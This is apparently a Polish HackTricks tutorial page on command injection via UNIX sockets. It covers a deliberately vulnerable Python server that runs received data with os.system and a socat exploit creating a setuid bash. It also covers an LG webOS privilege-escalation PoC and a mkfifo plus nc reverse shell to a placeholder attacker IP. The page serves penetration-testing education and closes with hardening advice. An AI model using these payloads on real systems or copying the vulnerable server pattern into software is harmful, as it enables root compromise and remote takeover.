# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Przykład powiązania socketu za pomocą Python

W poniższym przykładzie tworzony jest **unix socket** (`/tmp/socket_test.s`), a wszystko, co zostanie **odebrane**, zostanie **wykonane** przez `os.system`. Wiem, że nie znajdziesz tego w środowisku rzeczywistym, ale celem tego przykładu jest pokazanie, jak wygląda kod korzystający z unix sockets oraz jak zarządzać danymi wejściowymi w najgorszym możliwym przypadku.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Wykonaj** kod za pomocą python: `python s.py` i **sprawdź, jak socket nasłuchuje**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Studium przypadku: eskalacja uprawnień wyzwalana sygnałem przez socket UNIX należący do root (LG webOS)

Niektóre uprzywilejowane demony udostępniają socket UNIX należący do root, który przyjmuje niezaufane dane wejściowe i wiąże uprzywilejowane działania z identyfikatorami wątków oraz sygnałami. Jeśli protokół pozwala nieuwierzytelnionemu klientowi wpływać na to, do którego wątku natywnego zostanie skierowane żądanie, może być możliwe wywołanie uprzywilejowanej ścieżki kodu i eskalacja uprawnień.

Zaobserwowany schemat:
- Połącz się z socketem należącym do root, np. /tmp/remotelogger.
- Utwórz wątek i uzyskaj jego natywny identyfikator wątku (TID).
- Wyślij TID (w postaci spakowanej) wraz z dopełnieniem jako żądanie; odbierz potwierdzenie.
- Dostarcz określony sygnał do tego TID, aby wyzwolić uprzywilejowane działanie.

Minimalny szkic PoC:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Aby zamienić to w powłokę root, można użyć prostego wzorca named-pipe + nc:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Uwagi:
- Ta klasa błędów wynika z zaufania do wartości pochodzących ze stanu klienta pozbawionego uprawnień (TIDs) i wiązania ich z uprzywilejowanymi handlerami sygnałów lub logiką.
- Wzmocnij zabezpieczenia, wymuszając uwierzytelnianie na socket, sprawdzając formaty wiadomości oraz oddzielając uprzywilejowane operacje od dostarczanych z zewnątrz identyfikatorów wątków.

## Odniesienia

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
